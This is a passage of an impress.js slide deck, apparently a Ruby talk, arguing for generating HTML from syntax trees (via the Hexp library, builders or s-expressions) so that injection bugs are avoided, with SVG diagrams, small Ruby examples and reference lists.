<!-- b&#45;&gt;d -->
<g id="edge20" class="edge"><title>b-&gt;d</title>
<path fill="none" stroke="blue" d="M438,-71.8314C438,-61 438,-47.2876 438,-36.4133"></path>
</g>
<!-- e -->
<g id="node25" class="node"><title>e</title>
<ellipse fill="none" stroke="blue" cx="492" cy="-18" rx="18" ry="18"></ellipse>
</g>
<!-- b&#45;&gt;e -->
<g id="edge22" class="edge"><title>b-&gt;e</title>
<path fill="none" stroke="blue" d="M448.928,-75.4297C458.296,-62.938 471.724,-45.034 481.089,-32.5486"></path>
</g>
</g>
</svg></div></div>
      <div class='step center bigger' data-x='34000' data-y='0'>
    <div class='dot-wrap'><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" viewBox="0.00 0.00 518.00 332.00">
<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 328)">
<title>commmunication</title>

<!-- z1 -->
<g id="node1" class="node"><title>z1</title>
<ellipse fill="none" stroke="green" cx="18" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- c -->
<g id="node2" class="node"><title>c</title>
<ellipse fill="none" stroke="red" cx="384" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- f -->
<g id="node3" class="node"><title>f</title>
<ellipse fill="none" stroke="red" cx="357" cy="-90" rx="18" ry="18"></ellipse>
</g>
<!-- c&#45;&gt;f -->
<g id="edge24" class="edge"><title>c-&gt;f</title>
<path fill="none" stroke="red" d="M377.601,-144.937C373.297,-133.46 367.647,-118.392 363.353,-106.941"></path>
</g>
<!-- g -->
<g id="node4" class="node"><title>g</title>
<ellipse fill="none" stroke="red" cx="411" cy="-90" rx="18" ry="18"></ellipse>
</g>
<!-- c&#45;&gt;g -->
<g id="edge26" class="edge"><title>c-&gt;g</title>
<path fill="none" stroke="red" d="M390.399,-144.937C394.703,-133.46 400.353,-118.392 404.647,-106.941"></path>
</g>
<!-- h -->
<g id="node5" class="node"><title>h</title>
<ellipse fill="none" stroke="red" cx="411" cy="-18" rx="18" ry="18"></ellipse>
</g>
<!-- g&#45;&gt;h -->
<g id="edge28" class="edge"><title>g-&gt;h</title>
<path fill="none" stroke="red" d="M411,-71.8314C411,-61 411,-47.2876 411,-36.4133"></path>
</g>
<!-- x1 -->
<g id="node7" class="node"><title>x1</title>
<ellipse fill="none" stroke="blue" cx="72" cy="-306" rx="18" ry="18"></ellipse>
</g>
<!-- y1 -->
<g id="node9" class="node"><title>y1</title>
<ellipse fill="none" stroke="blue" cx="72" cy="-234" rx="18" ry="18"></ellipse>
</g>
<!-- x1&#45;&gt;y1 -->
<g id="edge3" class="edge"><title>x1-&gt;y1</title>
<path fill="none" stroke="blue" d="M72,-287.831C72,-277 72,-263.288 72,-252.413"></path>
</g>
<!-- y1&#45;&gt;z1 -->
<g id="edge4" class="edge"><title>y1-&gt;z1</title>
<path fill="none" stroke="blue" d="M61.0723,-219.43C51.7035,-206.938 38.2755,-189.034 28.9115,-176.549"></path>
</g>
<!-- z2 -->
<g id="node11" class="node"><title>z2</title>
<ellipse fill="none" stroke="blue" cx="72" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- y1&#45;&gt;z2 -->
<g id="edge6" class="edge"><title>y1-&gt;z2</title>
<path fill="none" stroke="blue" d="M72,-215.831C72,-205 72,-191.288 72,-180.413"></path>
</g>
<!-- z3 -->
<g id="node13" class="node"><title>z3</title>
<ellipse fill="none" stroke="blue" cx="126" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- y1&#45;&gt;z3 -->
<g id="edge8" class="edge"><title>y1-&gt;z3</title>
<path fill="none" stroke="blue" d="M82.9277,-219.43C92.2965,-206.938 105.724,-189.034 115.089,-176.549"></path>
</g>
<!-- aa -->
<g id="node18" class="node"><title>aa</title>
<ellipse fill="blue" stroke="blue" cx="110" cy="-234" rx="1.8" ry="1.8"></ellipse>
</g>
<!-- y1&#45;&gt;aa -->
<g id="edge31" class="edge"><title>y1-&gt;aa</title>
</g>
<!-- serializer -->
<g id="node15" class="node"><title>serializer</title>
<polygon fill="none" stroke="blue" points="210,-252 130,-252 130,-216 210,-216 210,-252"></polygon>
<text text-anchor="middle" x="170" y="-230.4" font-family="Times Roman,serif" font-size="14.00">serializer</text>
</g>
<!-- network -->
<g id="node16" class="node"><title>network</title>
<text text-anchor="middle" x="265" y="-230.4" font-family="Times Roman,serif" font-size="14.00">network</text>
</g>
<!-- serializer&#45;&gt;network -->
<g id="edge12" class="edge"><title>serializer-&gt;network</title>
<path fill="none" stroke="blue" d="M210.078,-234C215.942,-234 221.806,-234 227.67,-234"></path>
</g>
<!-- parser -->
<g id="node17" class="node"><title>parser</title>
<polygon fill="none" stroke="blue" points="380,-252 320,-252 320,-216 380,-216 380,-252"></polygon>
<text text-anchor="middle" x="350" y="-230.4" font-family="Times Roman,serif" font-size="14.00">parser</text>
</g>
<!-- network&#45;&gt;parser -->
<g id="edge13" class="edge"><title>network-&gt;parser</title>
<path fill="none" stroke="blue" d="M302.188,-234C308.04,-234 313.892,-234 319.744,-234"></path>
</g>
<!-- bb -->
<g id="node20" class="node"><title>bb</title>
<ellipse fill="blue" stroke="blue" cx="400" cy="-234" rx="1.8" ry="1.8"></ellipse>
</g>
<!-- parser&#45;&gt;bb -->
<g id="edge14" class="edge"><title>parser-&gt;bb</title>
<path fill="none" stroke="blue" d="M380.078,-234C386.096,-234 392.114,-234 398.132,-234"></path>
</g>
<!-- aa&#45;&gt;serializer -->
<g id="edge11" class="edge"><title>aa-&gt;serializer</title>
<path fill="none" stroke="blue" d="M111.875,-234C117.778,-234 123.682,-234 129.585,-234"></path>
</g>
<!-- b -->
<g id="node24" class="node"><title>b</title>
<ellipse fill="none" stroke="blue" cx="438" cy="-234" rx="18" ry="18"></ellipse>
</g>
<!-- bb&#45;&gt;b -->
<g id="edge33" class="edge"><title>bb-&gt;b</title>
</g>
<!-- a -->
<g id="node22" class="node"><title>a</title>
<ellipse fill="none" stroke="blue" cx="438" cy="-306" rx="18" ry="18"></ellipse>
</g>
<!-- a&#45;&gt;b -->
<g id="edge17" class="edge"><title>a-&gt;b</title>
<path fill="none" stroke="blue" d="M438,-287.831C438,-277 438,-263.288 438,-252.413"></path>
</g>
<!-- b&#45;&gt;c -->
<g id="edge18" class="edge"><title>b-&gt;c</title>
<path fill="none" stroke="blue" d="M427.072,-219.43C417.704,-206.938 404.276,-189.034 394.911,-176.549"></path>
</g>
<!-- d -->
<g id="node26" class="node"><title>d</title>
<ellipse fill="none" stroke="blue" cx="438" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- b&#45;&gt;d -->
<g id="edge20" class="edge"><title>b-&gt;d</title>
<path fill="none" stroke="blue" d="M438,-215.831C438,-205 438,-191.288 438,-180.413"></path>
</g>
<!-- e -->
<g id="node28" class="node"><title>e</title>
<ellipse fill="none" stroke="blue" cx="492" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- b&#45;&gt;e -->
<g id="edge22" class="edge"><title>b-&gt;e</title>
<path fill="none" stroke="blue" d="M448.928,-219.43C458.296,-206.938 471.724,-189.034 481.089,-176.549"></path>
</g>
</g>
</svg></div></div>
      <div class='step center bigger' data-x='35000' data-y='0'>
    <div class='dot-wrap'><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" viewBox="0.00 0.00 384.00 352.00">
<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 348)">
<title>commmunication</title>

<!-- c -->
<g id="node1" class="node"><title>c</title>
<ellipse fill="none" stroke="red" cx="250" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- f -->
<g id="node2" class="node"><title>f</title>
<ellipse fill="none" stroke="red" cx="223" cy="-90" rx="18" ry="18"></ellipse>
</g>
<!-- c&#45;&gt;f -->
<g id="edge16" class="edge"><title>c-&gt;f</title>
<path fill="none" stroke="red" d="M243.601,-144.937C239.297,-133.46 233.647,-118.392 229.353,-106.941"></path>
</g>
<!-- g -->
<g id="node3" class="node"><title>g</title>
<ellipse fill="none" stroke="red" cx="277" cy="-90" rx="18" ry="18"></ellipse>
</g>
<!-- c&#45;&gt;g -->
<g id="edge18" class="edge"><title>c-&gt;g</title>
<path fill="none" stroke="red" d="M256.399,-144.937C260.703,-133.46 266.353,-118.392 270.647,-106.941"></path>
</g>
<!-- h -->
<g id="node4" class="node"><title>h</title>
<ellipse fill="none" stroke="red" cx="277" cy="-18" rx="18" ry="18"></ellipse>
</g>
<!-- g&#45;&gt;h -->
<g id="edge20" class="edge"><title>g-&gt;h</title>
<path fill="none" stroke="red" d="M277,-71.8314C277,-61 277,-47.2876 277,-36.4133"></path>
</g>
<!-- y1 -->
<g id="node6" class="node"><title>y1</title>
<ellipse fill="none" stroke="blue" cx="27" cy="-244" rx="27.0758" ry="27.5772"></ellipse>
<text text-anchor="middle" x="27" y="-240.4" font-family="Times Roman,serif" font-size="14.00">???</text>
</g>
<!-- aa -->
<g id="node10" class="node"><title>aa</title>
<ellipse fill="blue" stroke="blue" cx="74" cy="-244" rx="1.8" ry="1.8"></ellipse>
</g>
<!-- y1&#45;&gt;aa -->
<g id="edge23" class="edge"><title>y1-&gt;aa</title>
</g>
<!-- network -->
<g id="node8" class="node"><title>network</title>
<text text-anchor="middle" x="131" y="-240.4" font-family="Times Roman,serif" font-size="14.00">network</text>
</g>
<!-- parser -->
<g id="node9" class="node"><title>parser</title>
<polygon fill="none" stroke="blue" points="246,-262 186,-262 186,-226 246,-226 246,-262"></polygon>
<text text-anchor="middle" x="216" y="-240.4" font-family="Times Roman,serif" font-size="14.00">parser</text>
</g>
<!-- network&#45;&gt;parser -->
<g id="edge5" class="edge"><title>network-&gt;parser</title>
<path fill="none" stroke="blue" d="M168.188,-244C174.04,-244 179.892,-244 185.744,-244"></path>
</g>
<!-- bb -->
<g id="node12" class="node"><title>bb</title>
<ellipse fill="blue" stroke="blue" cx="266" cy="-244" rx="1.8" ry="1.8"></ellipse>
</g>
<!-- parser&#45;&gt;bb -->
<g id="edge6" class="edge"><title>parser-&gt;bb</title>
<path fill="none" stroke="blue" d="M246.078,-244C252.096,-244 258.114,-244 264.132,-244"></path>
</g>
<!-- aa&#45;&gt;network -->
<g id="edge4" class="edge"><title>aa-&gt;network</title>
<path fill="none" stroke="blue" d="M76.2266,-244C82.0748,-244 87.923,-244 93.7712,-244"></path>
</g>
<!-- b -->
<g id="node16" class="node"><title>b</title>
<ellipse fill="none" stroke="blue" cx="304" cy="-244" rx="18" ry="18"></ellipse>
</g>
<!-- bb&#45;&gt;b -->
<g id="edge25" class="edge"><title>bb-&gt;b</title>
</g>
<!-- a -->
<g id="node14" class="node"><title>a</title>
<ellipse fill="none" stroke="blue" cx="304" cy="-326" rx="18" ry="18"></ellipse>
</g>
<!-- a&#45;&gt;b -->
<g id="edge9" class="edge"><title>a-&gt;b</title>
<path fill="none" stroke="blue" d="M304,-307.802C304,-294.213 304,-275.724 304,-262.148"></path>
</g>
<!-- b&#45;&gt;c -->
<g id="edge10" class="edge"><title>b-&gt;c</title>
<path fill="none" stroke="blue" d="M294.096,-228.96C284.413,-214.257 269.748,-191.988 260.025,-177.222"></path>
</g>
<!-- d -->
<g id="node18" class="node"><title>d</title>
<ellipse fill="none" stroke="blue" cx="304" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- b&#45;&gt;d -->
<g id="edge12" class="edge"><title>b-&gt;d</title>
<path fill="none" stroke="blue" d="M304,-225.802C304,-212.213 304,-193.724 304,-180.148"></path>
</g>
<!-- e -->
<g id="node20" class="node"><title>e</title>
<ellipse fill="none" stroke="blue" cx="358" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- b&#45;&gt;e -->
<g id="edge14" class="edge"><title>b-&gt;e</title>
<path fill="none" stroke="blue" d="M313.904,-228.96C323.587,-214.257 338.252,-191.988 347.975,-177.222"></path>
</g>
</g>
</svg></div></div>
      <div class='step statement center' data-x='36000' data-y='0'>
    
<p>this is <strong>not</strong> a <strong>new concept</strong></p>

<p>we <strong>already do this</strong> for SQL</p>
</div>
      <div class='step center' data-x='37000' data-y='0'>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ruby">@users = User.where(name: params[:query])
</code></pre>
</div>
      <div class='step center' data-x='38000' data-y='0'>
    <div class='dot-wrap'><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="600px" viewBox="0.00 0.00 370.00 340.00">
<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 336)">
<title>ar</title>

<!-- relation -->
<g id="node1" class="node"><title>relation</title>
<text text-anchor="middle" x="127" y="-310.4" font-family="Times Roman,serif" font-size="14.00">#&lt;AR::Relation&gt;</text>
</g>
<!-- SELECT -->
<g id="node7" class="node"><title>SELECT</title>
<ellipse fill="none" stroke="black" cx="127" cy="-241" rx="50.2046" ry="18.3848"></ellipse>
<text text-anchor="middle" x="127" y="-237.4" font-family="Times Roman,serif" font-size="14.00">SELECT</text>
</g>
<!-- relation&#45;&#45;SELECT -->
<g id="edge2" class="edge"><title>relation--SELECT</title>
<path fill="none" stroke="black" d="M127,-295.955C127,-284.893 127,-270.762 127,-259.6"></path>
</g>
<!-- star -->
<g id="node2" class="node"><title>star</title>
<polygon fill="none" stroke="black" points="-0.5,-149 -0.5,-185 68.5,-185 68.5,-149 -0.5,-149"></polygon>
<text text-anchor="middle" x="22" y="-163.4" font-family="Times Roman,serif" font-size="14.00">field</text>
<polyline fill="none" stroke="black" points="44.5,-149 44.5,-185 "></polyline>
<text text-anchor="middle" x="56.5" y="-163.4" font-family="Times Roman,serif" font-size="14.00">*</text>
</g>
<!-- name -->
<g id="node3" class="node"><title>name</title>
<polygon fill="none" stroke="black" points="120,-1 120,-37 220,-37 220,-1 120,-1"></polygon>
<text text-anchor="middle" x="142.5" y="-15.4" font-family="Times Roman,serif" font-size="14.00">field</text>
<polyline fill="none" stroke="black" points="165,-1 165,-37 "></polyline>
<text text-anchor="middle" x="192.5" y="-15.4" font-family="Times Roman,serif" font-size="14.00">name</text>
</g>
<!-- users -->
<g id="node4" class="node"><title>users</title>
<polygon fill="none" stroke="black" points="75,-75 75,-111 179,-111 179,-75 75,-75"></polygon>
<text text-anchor="middle" x="100.5" y="-89.4" font-family="Times Roman,serif" font-size="14.00">table</text>
<polyline fill="none" stroke="black" points="126,-75 126,-111 "></polyline>
<text text-anchor="middle" x="152.5" y="-89.4" font-family="Times Roman,serif" font-size="14.00">users</text>
</g>
<!-- query -->
<g id="node5" class="node"><title>query</title>
<polygon fill="none" stroke="black" points="238,-1 238,-37 362,-37 362,-1 238,-1"></polygon>
<text text-anchor="middle" x="266" y="-15.4" font-family="Times Roman,serif" font-size="14.00">string</text>
<polyline fill="none" stroke="black" points="294,-1 294,-37 "></polyline>
<text text-anchor="middle" x="328" y="-15.4" font-family="Times Roman,serif" font-size="14.00">"query"</text>
</g>
<!-- SELECT&#45;&#45;star -->
<g id="edge4" class="edge"><title>SELECT--star</title>
<path fill="none" stroke="black" d="M105.897,-224.208C91.2128,-212.524 71.6545,-196.962 56.6444,-185.018"></path>
</g>
<!-- FROM -->
<g id="node10" class="node"><title>FROM</title>
<ellipse fill="none" stroke="black" cx="127" cy="-167" rx="41.0122" ry="18.3848"></ellipse>
<text text-anchor="middle" x="127" y="-163.4" font-family="Times Roman,serif" font-size="14.00">FROM</text>
</g>
<!-- SELECT&#45;&#45;FROM -->
<g id="edge6" class="edge"><title>SELECT--FROM</title>
<path fill="none" stroke="black" d="M127,-222.327C127,-211.109 127,-196.884 127,-185.667"></path>
</g>
<!-- WHERE -->
<g id="node13" class="node"><title>WHERE</title>
<ellipse fill="none" stroke="black" cx="235" cy="-167" rx="48.9975" ry="18.3848"></ellipse>
<text text-anchor="middle" x="235" y="-163.4" font-family="Times Roman,serif" font-size="14.00">WHERE</text>
</g>
<!-- SELECT&#45;&#45;WHERE -->
<g id="edge10" class="edge"><title>SELECT--WHERE</title>
<path fill="none" stroke="black" d="M150.969,-224.577C168.866,-212.314 193.217,-195.629 211.098,-183.377"></path>
</g>
<!-- FROM&#45;&#45;users -->
<g id="edge8" class="edge"><title>FROM--users</title>
<path fill="none" stroke="black" d="M127,-148.327C127,-136.938 127,-122.449 127,-111.156"></path>
</g>
<!-- eq -->
<g id="node15" class="node"><title>eq</title>
<ellipse fill="none" stroke="black" cx="235" cy="-93" rx="27" ry="18.3848"></ellipse>
<text text-anchor="middle" x="235" y="-89.4" font-family="Times Roman,serif" font-size="14.00">eq</text>
</g>
<!-- WHERE&#45;&#45;eq -->
<g id="edge12" class="edge"><title>WHERE--eq</title>
<path fill="none" stroke="black" d="M235,-148.327C235,-137.109 235,-122.884 235,-111.667"></path>
</g>
<!-- eq&#45;&#45;name -->
<g id="edge14" class="edge"><title>eq--name</title>
<path fill="none" stroke="black" d="M220.896,-76.9431C210.591,-65.2109 196.606,-49.2899 185.903,-37.1054"></path>
</g>
<!-- eq&#45;&#45;query -->
<g id="edge16" class="edge"><title>eq--query</title>
<path fill="none" stroke="black" d="M249.104,-76.9431C259.409,-65.2109 273.394,-49.2899 284.097,-37.1054"></path>
</g>
</g>
</svg></div><div class='notes' style='display:none;'>Now we can revisit our injection attacks. In this case a syntax tree is built, this can then be used to generate the SQL dialect we need.

This is good because we can express our intent (semantics), and the data structure reflects those semantics.
</div></div>
      <div class='step ' data-x='39000' data-y='0'>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ruby">def helper
  "&lt;p&gt; haikus are pretty &lt;p&gt;".html_safe
end
</code></pre>
</div>
      <div class='step center' data-x='40000' data-y='0'>
    <div class='dot-wrap'><svg width="600px" viewbox="0.00 0.00 372.00 60.00" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 56)">
<title>html_safe</title>

<!-- string -->
<g id="node1" class="node"><title>string</title>
<polygon fill="none" stroke="black" points="0,-0 0,-52 364,-52 364,-0 0,-0"></polygon>
<text text-anchor="middle" x="182" y="-35.4" font-family="Times Roman,serif" font-size="14.00">String</text>
<polyline fill="none" stroke="black" points="0,-26 364,-26 "></polyline>
<text text-anchor="middle" x="112.5" y="-9.4" font-family="Times Roman,serif" font-size="14.00">"&lt;p&gt; haikus are pretty &lt;\p&gt;"</text>
<polyline fill="none" stroke="black" points="225,-0 225,-26 "></polyline>
<text text-anchor="middle" x="294.5" y="-9.4" font-family="Times Roman,serif" font-size="14.00">@html_safe=true</text>
</g>
</g>
</svg></div></div>
      <div class='step center' data-x='41000' data-y='0'>
    
<h1>HTML</h1>
</div>
      <div class='step statement center' data-x='42000' data-y='0'>
    
<p>Language, a <strong>set of strings</strong></p>

<p>Browsers accept <strong>every string</strong></p>

<p>Is this a language?</p>
</div>
      <div class='step center' data-x='43000' data-y='0'>
    
<h1>Postel&#39;s principle</h1>
</div>
      <div class='step statement center' data-x='44000' data-y='0'>
    
<p>Be <strong>conservative</strong> in what you <strong>send</strong></p>

<p>be <strong>liberal</strong> in what you <strong>accept</strong></p>
</div>
      <div class='step statement center thumb' data-x='45000' data-y='0'>
    
<p>&nbsp;</p>

<p>Be <strong>conservative</strong> in what you <strong>send</strong></p>

<p>&nbsp;</p>
</div>
      <div class='step statement center cry' data-x='46000' data-y='0'>
    
<p>&nbsp;</p>

<p>be <strong>liberal</strong> in what you <strong>accept</strong></p>

<p>&nbsp;</p>

<p>&nbsp;</p>
</div>
      <div class='step statement center' data-x='47000' data-y='0'>
    
<p>HTML &quot;parsers&quot; are <strong>rewriting engines</strong></p>

<p>To stay <strong>safe</strong> we should stay <strong>strict</strong></p>

<p>Let someone else handle this hairy mess</p>
</div>
      <div class='step center' data-x='48000' data-y='0'>
    
<h1>Why? (cont.)</h1>
</div>
      <div class='step center statement' data-x='49000' data-y='0'>
    
<p>in case <strong>security</strong></p>

<p>is <strong>not enough</strong> for you</p>
</div>
      <div class='step center statement' data-x='50000' data-y='0'>
    
<p><strong>higher level</strong> of abstraction</p>

<p>is more <strong>expressive</strong></p>

<p>and more <strong>productive</strong></p>
</div>
      <div class='step center' data-x='51000' data-y='0'>
    
<h1>How?</h1>
</div>
      <div class='step ' data-x='52000' data-y='0'>
    
<h2>Shopping list</h2>

<ol>
<li>A solid data type for syntax trees</li>
<li>quality parsers/generators</li>
<li>problem domain specific APIs to deal with 1.</li>
</ol>
</div>
      <div class='step center' data-x='53000' data-y='0'>
    
<h1>Apples and snakes architecture</h1>
</div>
      <div class='step ' data-x='54000' data-y='0'>
    
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<img src="snakes_and_apples.png" alt="">
</p>
</div>
      <div class='step statement center' data-x='55000' data-y='0'>
    
<p>Keep the <strong>snakes</strong> out of the app</p>

<p>parse/generate at the app boundary</p>

<p>Inside the app, only <strong>apples</strong></p>
</div>
      <div class='step center' data-x='56000' data-y='0'>
    
<h1>Building trees</h1>

<h2>Constructing literals</h2>
</div>
      <div class='step statement center' data-x='57000' data-y='0'>
    
<p>The data structure must be</p>

<p><strong>composable</strong> and</p>

<p><strong>easy to reason</strong> about</p>
</div>
      <div class='step ' data-x='58000' data-y='0'>
    
<h2>Objects</h2>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ruby">@doc = Nokogiri::HTML::Document.new
@html = Nokogiri::XML::Element.new('html', @doc)
@doc &lt;&lt; @html
@doc.to_html
</code></pre>

<ul>
<li>tedious</li>
<li>libxml2 means only HTML 4.01</li>
<li>but : correct</li>
<li>kind of composable</li>
</ul>
<div class='notes' style='display:none;'>The default for doing these kind of things, but ; tedious to work with ; only HTML 4.01 (because of libxml2), optimized for parsing.
</div></div>
      <div class='step ' data-x='59000' data-y='0'>
    
<h2>Builder syntax</h2>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ruby">HTML::Builder.new do
  html do
    body do
      p 'hello, world'
    end
  end
end
</code></pre>

<ul>
<li>implementations vary</li>
<li>need to return a Node/Tree, not a string</li>
<li>what is <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<code class="inline prettyprint">self</code>
?</li>
</ul>
<div class='notes' style='display:none;'>Can be a pain to keep track of `self`, some magic involved, but feels natural.

Important that the result can be recombined, not the case with Nokogiri::HTML::Builder.
</div></div>
      <div class='step ' data-x='60000' data-y='0'>
    
<h2>Templating</h2>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint haml">%div
  .big
    = "Hello RuLu"
</code></pre>

<ul>
<li>HAML isn&#39;t Apples and Snakes</li>
<li>but it could be</li>
<li>disallow inserting HTML strings</li>
<li>recognize Node/Tree types</li>
</ul>
</div>
      <div class='step ' data-x='61000' data-y='0'>
    
<h2>S-expressions</h2>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint lisp">('p ('em "hello, world"))
</code></pre>

<p>&nbsp;</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ruby">[:p, [:em, "hello, world"]]
</code></pre>

<ul>
<li>simple</li>
<li>lightweight</li>
<li>easy to program / reason</li>
</ul>
<div class='notes' style='display:none;'>Simple, lightweight, easy to reason about.
</div></div>
      <div class='step ' data-x='62000' data-y='0'>
    
<p>Now you can actually program your HTML</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ruby">class MyController
  def index
    page = SignupPage.new
    if request.post?
      page.rewrite(PopulateFormFields.new(params))
    end
    render Layout.new(page)
  end
end
</code></pre>
<div class='notes' style='display:none;'>Other ideas : add file/line numbers in dev mode ; structural validation ; presentation vs data separation.
</div></div>
      <div class='step center' data-x='63000' data-y='0'>
    
<h1>Hexp</h1>

<h2>Demo</h2>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ">https://github.com/plexus/hexp
</code></pre>
</div>
      <div class='step center' data-x='64000' data-y='0'>
    
<h1>In summary</h1>
</div>
      <div class='step center' data-x='65000' data-y='0'>
    
<h1>Don&#39;t serialize by hand</h1>
</div>
      <div class='step statement center' data-x='66000' data-y='0'>
    
<p>Don&#39;t <strong>reinvent the wheel</strong> (badly)</p>

<p>mixing s11n with logic violates <strong>SRP</strong></p>

<p>Let a library do the serialization for you</p>
</div>
      <div class='step center' data-x='67000' data-y='0'>
    
<h1>Aim high level</h1>
</div>
      <div class='step statement center' data-x='68000' data-y='0'>
    
<p>You care about <strong>semantics</strong></p>

<p>the closest representation</p>

<p>is the <strong>syntax tree</strong></p>
</div>
      <div class='step center' data-x='69000' data-y='0'>
    
<h1>More expressive power</h1>
</div>
      <div class='step statement center' data-x='70000' data-y='0'>
    
<p>Data structures are <strong>programmable</strong></p>

<p>they make your code</p>

<p>more <strong>powerful</strong> and <strong>expressive</strong></p>
</div>
      <div class='step statement center' data-x='71000' data-y='0'>
    
<p>Oh and BTW</p>

<p>injection attacks</p>
</div>
      <div class='step ' data-x='72000' data-y='0'>
    
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<img src="snakes_and_apples.png" alt="">
</p>
</div>
      <div class='step center' data-x='73000' data-y='0'>
    
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<img src="wizard_cry.png" alt="">
</p>
</div>
      <div class='step center' data-x='74000' data-y='0'>
    
<div class='huge'>

Q ?

</div>
</div>
      <div class='step ' data-x='75000' data-y='0'>
    
<h1>Thank you!</h1>
</div>
      <div class='step ' data-x='76000' data-y='0'>
    
<h1>References</h1>
</div>
      <div class='step ' data-x='77000' data-y='0'>
    
<h2>Blog posts</h2>

<ul>
<li><a href="http://acko.net/blog/safe-string-theory-for-the-web/">Safe String Theory for the web</a> by Steven Wittens</li>
<li><a href="http://www.more-magic.net/posts/structurally-fixing-injection-bugs.html">Structurally Fixing Injection Bugs</a> by Peter Bex</li>
<li><a href="http://adit.io/posts/2012-04-14-working_with_HTML_in_haskell.html">Working with HTML in Haskell</a> by Aditya Bhargava</li>
<li><a href="http://blog.moertel.com/posts/2006-10-18-a-type-based-solution-to-the-strings-problem.html">A type-based solution to the “strings problem”: a fitting end to XSS and SQL-injection holes?</a> by Tom Moertel</li>
<li><a href="http://devblog.arnebrasseur.net/2013-04-plain-text">The Devil in Plain Text</a> by Arne Brasseur</li>
</ul>
</div>
      <div class='step ' data-x='78000' data-y='0'>
    
<h2>Books</h2>

<ul>
<li>Speaking by Willem J.M. Levelt</li>
<li>An Introduction to Formal Languages and Automata by Peter Linz</li>
</ul>
</div>
      <div class='step ' data-x='79000' data-y='0'>
    
<h2>Security</h2>

<ul>
<li><a href="http://langsec.org/">Langsec</a></li>
<li><a href="http://www.youtube.com/watch?v=3kEfedtQVOY">The Science of Insecurity</a> by Meredith L. Patterson</li>
<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a></li>
</ul>
</div>
      <div class='step ' data-x='80000' data-y='0'>
    
<h2>Software</h2>

<p>Ruby</p>

<ul>
<li><a href="https://github.com/Wardrop/Formless">Formless</a>
Completely transparent, unobtrusive form populator for web applications and content scrapers</li>
<li><a href="https://github.com/flavorjones/loofah">Loofah</a>
HTML/XML manipulation and sanitization based on Nokogiri</li>
</ul>

<p>Common Lisp</p>

<ul>
<li><a href="http://jandmworks.com/cl-who-ext.html">CL-WHO</a></li>
</ul>

<p>Haskell</p>

<ul>
<li><a href="http://jaspervdj.be/blaze/tutorial.html">BlazeHtml</a></li>
<li><a href="http://www.yesodweb.com/book/widgets">Yesod framework</a></li>
<li>HXT</li>
</ul>

      </div>
    <script src="js/impress.js"></script>
    <script>impress().init();</script>
  </body>
</html>
    